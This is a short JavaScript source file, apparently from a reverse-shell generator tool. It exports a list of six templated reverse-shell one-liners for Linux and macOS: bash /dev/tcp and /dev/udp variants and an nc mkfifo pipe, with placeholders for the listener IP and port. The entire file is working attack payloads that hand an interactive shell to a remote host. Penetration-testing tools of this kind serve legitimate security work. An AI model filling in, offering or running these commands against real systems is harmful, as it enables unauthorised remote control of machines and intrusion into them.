export const reverseShellCommands = [
    {
        name: "Bash -i",
        template: `sh -i >& /dev/tcp/{useIp}/{port} 0>&1`,
        meta: ["linux", "mac"],
    },
    {
        name: "Bash 196",
        template: `0<&196;exec 196<>/dev/tcp/{useIp}/{port}; sh <&196 >&196 2>&196`,
        meta: ["linux", "mac"],
    },
    {
        name: "Bash read line",
        template: `exec 5<>/dev/tcp/{useIp}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
        meta: ["linux", "mac"],
    },
    {
        name: "Bash 5",
        template: `sh -i 5<> /dev/tcp/{useIp}/{port} 0<&5 1>&5 2>&5`,
        meta: ["linux", "mac"],
    },
    {
        name: "Bash udp",
        template: `sh -i >& /dev/udp/{useIp}/{port} 0>&1`,
        meta: ["linux", "mac"],
    },
    {
        name: "nc mkfifo",
        template: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {useIp} {port} >/tmp/f`,
        meta: ["linux", "mac"],
    },
];
